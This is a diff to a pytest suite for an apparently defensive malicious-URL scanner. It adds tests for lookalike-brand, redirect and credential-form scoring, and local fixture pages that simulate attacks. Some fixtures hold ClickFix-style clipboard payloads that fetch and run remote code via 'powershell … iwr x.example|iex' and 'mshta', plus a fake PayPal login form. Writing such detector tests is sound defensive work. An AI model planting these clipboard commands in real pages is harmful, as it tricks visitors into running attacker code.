@@ -103,6 +103,196 @@ def test_scoring_suspicious_tld():
     assert PnakoticScorer().score(result) == pytest.approx(0.3)
 
 
+def _scored(target, final, hops=(), signals=None, **metadata):
+    from pnakotic.src.intelligence.scorer import PnakoticScorer
+    from pnakotic.src.scanner.models import RedirectHop, ScanResult
+
+    result = ScanResult(target_url=target, final_url=final)
+    result.hops = [RedirectHop(url=target, status_code=301, mechanism=m) for m in hops]
+    if signals is not None:
+        result.metadata["page_signals"] = signals
+    result.metadata.update(metadata)
+    return PnakoticScorer().score(result), result.metadata["scoring_findings"]
+
+
+_NO_SIGNALS = {"title": "", "password_inputs": 0, "forms": 0, "content_type": "text/html", "error_page": False}
+
+
+def test_scoring_brand_lookalike_on_throwaway_hosting():
+    target = "http://us05web-zoom-us82777747387473.pages.dev/"
+    final = "https://us05web-zoom-us82777747387473.pages.dev/"
+    signals = dict(_NO_SIGNALS, title="Zoom Meeting")
+    score, findings = _scored(target, final, ["http_3xx"], signals)
+    # brand_in_hostname + throwaway_hosting + brand_in_title (no password input, so no credential_form)
+    assert score == pytest.approx(0.4 + 0.15 + 0.2)
+    assert "Brand name in hostname: zoom on us05web-zoom-us82777747387473.pages.dev" in findings
+    assert "Free hosting platform: pages.dev" in findings
+    assert not any("Credential form" in f for f in findings)
+
+    score, findings = _scored(target, final, ["http_3xx"], dict(signals, password_inputs=1))
+    assert score == pytest.approx(0.95)  # + credential_form
+    assert "Credential form impersonating zoom on us05web-zoom-us82777747387473.pages.dev" in findings
+
+
+def test_scoring_google_lookalike_redirecting_to_google():
+    # googleplay.com is Google's own redirector: landing on the brand's domain exempts the hostname.
+    score, findings = _scored("https://googleplay.com/", "https://play.google.com/store/games", ["http_3xx"])
+    assert score == pytest.approx(0.2)  # high_value_landing only
+    assert not any("Brand name in hostname" in f for f in findings)
+    assert not any("different domain" in f for f in findings)
+    # The same hostname serving its own page is still a lookalike.
+    score, findings = _scored("https://googleplay.com/", "https://googleplay.com/", ["http_3xx"])
+    assert score == pytest.approx(0.4)
+    assert "Brand name in hostname: google on googleplay.com" in findings
+
+
+def test_scoring_cross_domain_redirect():
+    score, findings = _scored("https://topbook-game.online/", "https://chinatownrestaurantau.com/", ["http_3xx"])
+    assert score == pytest.approx(0.2)  # the TLD rules look at the final URL (.com)
+    assert "Redirected to a different domain: topbook-game.online -> chinatownrestaurantau.com" in findings
+
+
+def test_scoring_cross_domain_redirect_to_suspicious_tld():
+    score, findings = _scored("https://investrixai.net/", "https://finazy3-aut44.sbs/?d=x", ["http_3xx"])
+    assert score == pytest.approx(0.2 + 0.3)  # cross_domain_redirect + suspicious_tld
+    assert "Suspicious TLD: .sbs" in findings
+
+
+def test_scoring_same_apex_redirect_is_high_value_only():
+    score, findings = _scored("http://google.com/", "https://www.google.com/", ["http_3xx"])
+    assert score == pytest.approx(0.2)
+    assert not any(f.startswith(("Brand name", "Redirected to")) for f in findings)
+    score, _ = _scored("http://github.com/", "https://github.com/", ["http_3xx"])
+    assert score == 0.0
+
+
+@pytest.mark.parametrize("url", [
+    "https://www.apple.com/", "https://play.google.com/", "https://mail.google.co.uk/",
+    "https://www.wikipedia.org/", "https://stackoverflow.com/", "https://www.amazon.com/",
+    "https://www.amazon.co.uk/", "https://outlook.live.com/",
+])
+def test_scoring_benign_hosts_score_zero(url):
+    assert _scored(url, url)[0] == 0.0
+
+
+def test_scoring_brand_matching_rules():
+    # Brands of 5 or fewer letters match whole labels only; 6+ letter brands match inside a label.
+    assert _scored("https://zoomer.example/", "https://zoomer.example/")[0] == 0.0
+    assert _scored("https://my-zoom.example/", "https://my-zoom.example/")[0] == pytest.approx(0.4)
+    assert _scored("https://paypal-login.example/", "https://paypal-login.example/")[0] == pytest.approx(0.4)
+    # Country-code variants are the brand's own, but not an abused free ccTLD or a trailing-label trick.
+    assert _scored("https://www.google.de/", "https://www.google.de/")[0] == 0.0
+    assert _scored("https://google.tk/", "https://google.tk/")[0] == pytest.approx(0.4 + 0.3)
+    assert _scored("https://google.com.evil.example/", "https://google.com.evil.example/")[0] == pytest.approx(0.4)
+
+
+def test_scoring_watch_tld():
+    score, findings = _scored("https://valindexo.pro/", "https://valindexo.pro/")
+    assert score == pytest.approx(0.15)
+    assert "Abuse-prone TLD: .pro" in findings
+
+
+def test_scoring_navigation_failed_is_unweighted():
+    dead = "https://ap1.myprofessionalmail.com/appsuite/#"
+    score, findings = _scored("https://sso-godaddy-x.pages.dev/", dead, [], dict(_NO_SIGNALS, error_page=True),
+                              navigation_failed=dead)
+    base, _ = _scored("https://sso-godaddy-x.pages.dev/", dead, [], dict(_NO_SIGNALS, error_page=True))
+    assert score == pytest.approx(base)
+    assert "Navigation failed: ap1.myprofessionalmail.com unreachable" in findings
+
+
+def test_scoring_non_html_landing_is_unweighted():
+    url = "https://notable-tomato-gwy2plig-dpg5h1e6n5om.edgeone.dev/"
+    score, findings = _scored(url, url, [], dict(_NO_SIGNALS, content_type="audio/mpeg"))
+    base, _ = _scored(url, url, [], _NO_SIGNALS)
+    assert score == pytest.approx(base) == pytest.approx(0.15)  # edgeone.dev hosting only
+    assert "Landing document is not HTML: audio/mpeg" in findings
+
+
+def test_scoring_credential_form_needs_a_brand():
+    signals = dict(_NO_SIGNALS, title="Sign in to Outlook", password_inputs=1)
+    score, findings = _scored("https://random-host.example/", "https://random-host.example/", [], signals)
+    assert score == pytest.approx(0.4)
+    assert "Credential form impersonating outlook on random-host.example" in findings
+    assert _scored("https://outlook.live.com/", "https://outlook.live.com/", [], signals)[0] == 0.0
+    # A password input with no brand anywhere scores nothing.
+    plain = dict(_NO_SIGNALS, title="Log in", password_inputs=1)
+    assert _scored("https://random-host.example/", "https://random-host.example/", [], plain)[0] == 0.0
+
+
+def _nav_hop(mechanism, url, to):
+    import json
+    from pnakotic.src.scanner.models import RedirectHop
+
+    return RedirectHop(url=url, mechanism=mechanism, evidence=json.dumps({"id": mechanism, "to": to}))
+
+
+def test_scoring_same_site_js_navigation_is_unweighted():
+    from pnakotic.src.intelligence.scorer import PnakoticScorer
+    from pnakotic.src.scanner.models import RedirectHop, ScanResult
+
+    url = "https://www.amazon.com/"
+    result = ScanResult(target_url=url, final_url=url)
+    result.hops = [_nav_hop("js_location", url, url), RedirectHop(url=url, mechanism="js_obfuscation")]
+    # Amazon-style: a script reloading its own page plus String.fromCharCode in the bundle.
+    assert PnakoticScorer().score(result) == pytest.approx(0.1)
+    findings = result.metadata["scoring_findings"]
+    assert "JS navigation within the same site: www.amazon.com" in findings
+    assert "JS obfuscation helpers present (no cross-site redirect)" in findings
+
+    # Same page, but the script sends the visitor to another registrable domain.
+    result.hops[0] = _nav_hop("js_location", url, "https://other.example/")
+    assert PnakoticScorer().score(result) == pytest.approx(0.4 + 0.4)  # js_location + js_obfuscated
+    assert "JS location manipulation" in result.metadata["scoring_findings"]
+
+    # Unknown destination: old behaviour (counts as crossing).
+    result.hops[0] = RedirectHop(url=url, mechanism="js_location")
+    assert PnakoticScorer().score(result) == pytest.approx(0.8)
+
+
+def test_scoring_same_site_meta_refresh_is_unweighted():
+    from pnakotic.src.intelligence.scorer import PnakoticScorer
+    from pnakotic.src.scanner.models import ScanResult
+
+    result = ScanResult(target_url="https://shop.example.com/", final_url="https://shop.example.com/")
+    result.hops = [_nav_hop("meta_refresh", "https://shop.example.com/", "https://www.example.com/next")]
+    assert PnakoticScorer().score(result) == 0.0
+    assert "Meta refresh within the same site: shop.example.com" in result.metadata["scoring_findings"]
+
+
+def test_scoring_obfuscation_with_brand_is_full_weight():
+    signals = dict(_NO_SIGNALS)
+    score, _ = _scored("https://paypal-login.example/", "https://paypal-login.example/",
+                       ["js_obfuscation"], signals)
+    assert score == pytest.approx(0.4 + 0.4)  # brand_in_hostname + js_obfuscated
+
+
+def test_scoring_brand_leads_page_title():
+    signals = dict(_NO_SIGNALS, title="Google Play")
+    score, findings = _scored("http://plinkobonusplay.com/", "http://plinkobonusplay.com/", [], signals)
+    assert score == pytest.approx(0.2)
+    assert "Brand name leads page title: google on plinkobonusplay.com" in findings
+
+    # The brand's own host, or a brand that isn't among the first three words: nothing.
+    own = dict(_NO_SIGNALS, title="Android Apps on Google Play")
+    assert _scored("https://play.google.com/", "https://play.google.com/", [], own)[0] == 0.0
+    late = dict(_NO_SIGNALS, title="Free Android Apps on Google Play")
+    assert _scored("https://apps.example/", "https://apps.example/", [], late)[0] == 0.0
+
+    # With a password input the stronger credential_form applies instead, not both.
+    score, findings = _scored("http://plinkobonusplay.com/", "http://plinkobonusplay.com/", [],
+                              dict(signals, password_inputs=1))
+    assert score == pytest.approx(0.4)
+    assert not any(f.startswith("Brand name leads") for f in findings)
+
+
+def test_scoring_short_brand_tokens_match_whole_labels_only():
+    assert _scored("https://pineapple.com/", "https://pineapple.com/")[0] == 0.0
+    assert _scored("https://upstream.example/", "https://upstream.example/")[0] == 0.0
+    assert _scored("https://apple-id.example/", "https://apple-id.example/")[0] == pytest.approx(0.4)
+    assert _scored("https://googleplay.com/", "https://googleplay.com/")[0] == pytest.approx(0.4)
+
+
 def test_static_analyzer_b64_filter():
     from pnakotic.src.scanner.static_analyzer import StaticAnalyst
 
@@ -176,7 +366,15 @@ def test_scoring_obfuscation_counted_once():
         RedirectHop(url="https://x.example/", mechanism="js_obfuscation"),  # atob
         RedirectHop(url="https://x.example/", mechanism="js_obfuscation"),  # fromCharCode
     ]
+    # Obfuscation helpers alone (no cross-site redirect, no brand) are the weak tier: once.
+    assert PnakoticScorer().score(result) == pytest.approx(0.1)
+    assert "JS obfuscation helpers present (no cross-site redirect)" in result.metadata["scoring_findings"]
+
+    # Next to a cross-site observed redirect they are the full 0.4, still counted once.
+    result.hops.append(RedirectHop(url="https://x.example/", status_code=302, mechanism="http_3xx",
+                                   headers={"location": "https://y.example/"}))
     assert PnakoticScorer().score(result) == pytest.approx(0.4)
+    assert "JS obfuscation helpers (atob / String.fromCharCode)" in result.metadata["scoring_findings"]
 
 
 def test_scoring_deep_chain_ignores_static_hops():
@@ -187,7 +385,8 @@ def test_scoring_deep_chain_ignores_static_hops():
     passive.hops = [RedirectHop(url="https://x.example/", mechanism="static_analysis") for _ in range(6)]
     assert PnakoticScorer().score(passive) == 0.0
 
-    deep = ScanResult(target_url="https://x.example/", final_url="https://y.example/")
+    # Same apex before and after, so cross_domain_redirect stays out of this deep_chain-only case.
+    deep = ScanResult(target_url="https://x.example/", final_url="https://www.x.example/")
     deep.hops = [RedirectHop(url=f"https://h{i}.example/", status_code=302, mechanism="http_3xx") for i in range(6)]
     assert PnakoticScorer().score(deep) == pytest.approx(0.2)
 
@@ -284,10 +483,24 @@ def local_site():
                 self.end_headers()
                 self.wfile.write(f'fetch("http://localhost:{port}/leak-sw");'.encode())
                 return
+            if self.path == "/audio":  # a non-HTML landing document; Chrome wraps it in a <video> element
+                self.send_response(200)
+                self.send_header("Content-Type", "audio/mpeg")
+                self.end_headers()
+                self.wfile.write(b"\xff\xfb\x90\x00" * 8)
+                return
             self.send_response(200)
             self.send_header("Content-Type", "text/html")
             self.end_headers()
-            if self.path == "/ws-main":
+            if self.path == "/pw":
+                self.wfile.write(b"<html><head><title>Sign in to PayPal</title></head>"
+                                 b"<body><form><input type=password></form></body></html>")
+            elif self.path == "/self":  # reloads itself once (the flag stops the loop)
+                self.wfile.write(b"<html><script>if(!sessionStorage.getItem('r')){sessionStorage.setItem('r','1');"
+                                 b"location.href=location.href}</script><body>self</body></html>")
+            elif self.path == "/to-dead":
+                self.wfile.write(b"<html><script>location='http://no-such-host.invalid/x'</script></html>")
+            elif self.path == "/ws-main":
                 self.wfile.write(f"<html><body><script>new WebSocket('ws://localhost:{port}/leak-ws');</script></body></html>".encode())
             elif self.path == "/ws-worker":
                 src = f"new WebSocket('ws://localhost:{port}/leak-ws-worker');"
@@ -326,6 +539,11 @@ def local_site():
                 self.wfile.write(b"<html><body>Verify you are human<script>"
                                  b"navigator.clipboard.writeText('powershell -w h -c \"iwr x.example|iex\"').catch(function(){});"
                                  b"</script></body></html>")
+            elif self.path == "/clickfix-click":  # the real pattern: writes on the visitor's first click
+                self.wfile.write(b"<html><body style='height:2000px'>Verify you are human<script>"
+                                 b"document.addEventListener('click',function(){"
+                                 b"navigator.clipboard.writeText('powershell -w h -c \\\"iwr x.example|iex\\\"').catch(function(){});"
+                                 b"});</script></body></html>")
             elif self.path == "/clickfix-exec":  # the hidden-textarea + execCommand('copy') variant
                 self.wfile.write(b"<html><body><script>var t=document.createElement('textarea');"
                                  b"t.value='mshta https://x.example/v';document.body.appendChild(t);t.select();"
@@ -622,6 +840,32 @@ async def test_clipboard_command_is_decisive(local_site, tmp_path, path, via):
 
 @requires_browser
 @pytest.mark.asyncio
+async def test_password_form_page_signals(local_site, tmp_path):
+    base, _hits = local_site
+    result = await _local_engine(tmp_path).scan(f"{base}/pw")
+    signals = result.metadata["page_signals"]
+    assert signals["password_inputs"] == 1
+    assert signals["forms"] == 1
+    assert signals["title"] == "Sign in to PayPal"
+    assert signals["content_type"] == "text/html"
+    assert signals["error_page"] is False
+    # 127.0.0.1 is not PayPal's
+    assert any(f.startswith("Credential form impersonating paypal") for f in result.metadata["scoring_findings"])
+
+
+@requires_browser
+@pytest.mark.asyncio
+async def test_clipboard_command_on_click_is_caught_by_the_click_probe(local_site, tmp_path):
+    base, _ = local_site
+    result = await _local_engine(tmp_path).scan(f"{base}/clickfix-click")
+    assert result.metadata["click_probe"] == "clicked"
+    writes = [e for e in _behaviors(result) if e["id"] == "clipboard_write"]
+    assert writes and writes[0]["trigger"] == "click" and writes[0]["command"] is True
+    assert result.malicious_score == 1.0
+
+
+@requires_browser
+@pytest.mark.asyncio
 async def test_drive_by_download_is_recorded_and_cancelled(local_site, tmp_path):
     base, _ = local_site
     result = await _local_engine(tmp_path).scan(f"{base}/drive-by")
@@ -629,6 +873,17 @@ async def test_drive_by_download_is_recorded_and_cancelled(local_site, tmp_path)
     assert downloads and downloads[0]["filename"] == "Update.exe" and downloads[0]["executable"] is True
     assert result.malicious_score == 1.0
     assert not list(tmp_path.rglob("Update.exe"))  # never kept
+
+
+@requires_browser
+@pytest.mark.asyncio
+async def test_non_html_landing_is_not_analysed(local_site, tmp_path):
+    base, _hits = local_site
+    result = await _local_engine(tmp_path).scan(f"{base}/audio")
+    assert result.metadata["page_signals"]["content_type"] == "audio/mpeg"
+    assert not [h for h in result.hops if h.mechanism == "static_analysis"]
+    assert result.metadata["page_signals"]["title"] == ""
+    assert "Landing document is not HTML: audio/mpeg" in result.metadata["scoring_findings"]
 
 
 @requires_browser
@@ -641,6 +896,24 @@ async def test_browser_lock_is_decisive_and_dialogs_dismissed(local_site, tmp_pa
     assert result.malicious_score == 1.0
     assert any("browser-lock pattern" in f for f in result.metadata["decisive_findings"])
     assert result.metadata.get("raw_error") is None  # the dialogs did not hang the page
+
+
+@requires_browser
+@pytest.mark.asyncio
+async def test_redirect_to_unreachable_host_is_not_analysed(local_site, tmp_path):
+    base, _hits = local_site
+    result = await _local_engine(tmp_path).scan(f"{base}/to-dead")
+    assert len([h for h in result.hops if h.mechanism == "js_location"]) == 1
+    assert result.metadata["navigation_failed"] == "http://no-such-host.invalid/x"
+    assert result.final_url == "http://no-such-host.invalid/x"
+    assert result.metadata["page_signals"]["error_page"] is True
+    assert not [h for h in result.hops if h.url.startswith("chrome-error://")]
+    assert not [h for h in result.hops if h.mechanism == "static_analysis"]
+    # The egress policy only allows 127.0.0.1, so the guard refuses the destination; the
+    # navigation fails (chrome-error://) either way.
+    assert "no-such-host.invalid" in (result.metadata.get("blocked_hosts") or [])
+    assert "Navigation failed: no-such-host.invalid unreachable" in result.metadata["scoring_findings"]
+    assert list((tmp_path / "local-job" / "screenshots").glob("*.png"))
 
 
 @requires_browser
@@ -685,7 +958,7 @@ def test_behavior_recorder_bounds_page_input():
     assert len(rec.events) == MAX_PER_ID
     assert len(rec.events[0]["text"]) == MAX_TEXT
     for event_id in ("fullscreen_request", "keyboard_lock", "notification_request", "beforeunload_trap",
-                     "history_flood", "window_open") * MAX_PER_ID:
+                     "history_flood") * MAX_PER_ID:
         rec._on_page_event({}, {"id": event_id})
     assert len(rec.events) <= MAX_EVENTS
 
@@ -779,8 +1052,9 @@ async def test_every_profile_loads_and_cloaking_is_recorded(local_site, tmp_path
     base, _ = local_site
     result = await _two_site_engine(tmp_path).scan(f"{base}/cloak", "default", compare=True)
     cloaking = result.metadata["cloaking"]
-    assert cloaking["landings"] == {"default": "127.0.0.1", "mobile-ios": "localhost",
-                                    "mobile-android": "127.0.0.1", "search-clicker": "127.0.0.1"}
+    from pnakotic.src.scanner.profiles import PROFILES
+
+    assert cloaking["landings"] == {name: ("localhost" if name == "mobile-ios" else "127.0.0.1") for name in PROFILES}
     assert cloaking["common"] == "127.0.0.1" and cloaking["steered"] == ["mobile-ios"]
     ios = next(v for v in result.metadata["variants"] if v["profile"] == "mobile-ios")
     assert ios["final_url"].endswith("/scam") and ios["raw_error"] is None and ios["redirects"] == 1
@@ -789,7 +1063,7 @@ async def test_every_profile_loads_and_cloaking_is_recorded(local_site, tmp_path
     assert result.is_redirect_chain_detected is False
     shots = [a["rel_path"] for a in result.metadata["artifact_manifest"]["artifacts"]]
     assert sum(r.startswith("screenshots/") for r in shots) == 1  # the dashboard's landing shot
-    assert {r.split("/")[1] for r in shots if r.startswith("profiles/")} == {"mobile-ios", "mobile-android", "search-clicker"}
+    assert {r.split("/")[1] for r in shots if r.startswith("profiles/")} == set(PROFILES) - {"default"}
 
 
 @requires_browser
@@ -810,7 +1084,7 @@ def _landed(url, **metadata):
     return r
 
 
-def _scored(*results):
+def _scored_profiles(*results):
     from pnakotic.src.intelligence.scorer import PnakoticScorer
     for r in results:
         PnakoticScorer().score(r)
@@ -820,10 +1094,10 @@ def _scored(*results):
 def test_cloaking_onto_a_suspicious_page_is_decisive():
     from pnakotic.src.intelligence.scorer import PnakoticScorer
 
-    desktop, ios, android = _scored(_landed("https://www.shop.example/"), _landed("https://win-alert.xyz/"),
+    desktop, ios, android = _scored_profiles(_landed("https://www.shop.example/"), _landed("https://win-alert.xyz/"),
                                     _landed("https://www.shop.example/"))
     assert ios.malicious_score == pytest.approx(0.3)  # suspicious TLD only: not suspicious enough alone
-    ios.hops = [_behavior_hop(id="notification_request"), _behavior_hop(id="window_open")]
+    ios.hops = [_behavior_hop(id="notification_request")]
     PnakoticScorer().score(ios)
     assert ios.malicious_score >= 0.4
     assert PnakoticScorer().combine(desktop, "default", {"mobile-ios": ios, "mobile-android": android}) == 1.0
@@ -835,7 +1109,7 @@ def test_cloaking_with_a_bot_fallback_is_decisive():
     # most profiles get the scam; the bot-like desktop is sent to google.com
     from pnakotic.src.intelligence.scorer import PnakoticScorer
 
-    desktop, ios, android = _scored(_landed("https://www.google.com/"), _landed("https://10.20.30.40/"),
+    desktop, ios, android = _scored_profiles(_landed("https://www.google.com/"), _landed("https://10.20.30.40/"),
                                     _landed("https://10.20.30.40/"))
     PnakoticScorer().combine(desktop, "default", {"mobile-ios": ios, "mobile-android": android})
     assert desktop.metadata["cloaking"]["common"] == "10.20.30.40"
@@ -846,7 +1120,7 @@ def test_cloaking_with_a_bot_fallback_is_decisive():
 def test_harmless_profile_split_is_supporting_only():
     from pnakotic.src.intelligence.scorer import PnakoticScorer
 
-    desktop, ios = _scored(_landed("https://www.shop.example/"), _landed("https://apps.apple.com/app/shop"))
+    desktop, ios = _scored_profiles(_landed("https://www.shop.example/"), _landed("https://apps.apple.com/app/shop"))
     PnakoticScorer().combine(desktop, "default", {"mobile-ios": ios})
     assert desktop.metadata["decisive_findings"] == []
     assert desktop.malicious_score == pytest.approx(0.35)
@@ -856,7 +1130,7 @@ def test_harmless_profile_split_is_supporting_only():
 def test_same_landing_everywhere_is_not_cloaking():
     from pnakotic.src.intelligence.scorer import PnakoticScorer
 
-    desktop, ios = _scored(_landed("https://www.shop.example/"), _landed("https://m.shop.example/"))
+    desktop, ios = _scored_profiles(_landed("https://www.shop.example/"), _landed("https://m.shop.example/"))
     PnakoticScorer().combine(desktop, "default", {"mobile-ios": ios})
     assert desktop.metadata["cloaking"] is None and desktop.malicious_score == 0.0
 
@@ -1055,3 +1329,20 @@ def test_scoring_yara_tiers():
     assert score(hit("a", 5, False), hit("b", 2, False))[0] == pytest.approx(0.55)
     total, r = score(hit("a", 4, True))
     assert total == 1.0 and r.metadata["decisive_findings"][0].startswith("Decisive: known malicious code, YARA a")
+
+
+@requires_browser
+@pytest.mark.asyncio
+async def test_self_reload_is_not_a_redirect(local_site, tmp_path):
+    import json
+
+    base, _hits = local_site
+    result = await _local_engine(tmp_path).scan(f"{base}/self")
+    nav_hops = [h for h in result.hops if h.mechanism == "client_navigation"]
+    assert len(nav_hops) == 1
+    evidence = json.loads(nav_hops[0].evidence)
+    assert evidence["reason"] == "scriptInitiated"
+    assert evidence["self"] is True
+    assert not [h for h in result.hops if h.mechanism == "js_location"]
+    assert result.is_redirect_chain_detected is False
+    assert result.final_url == f"{base}/self"
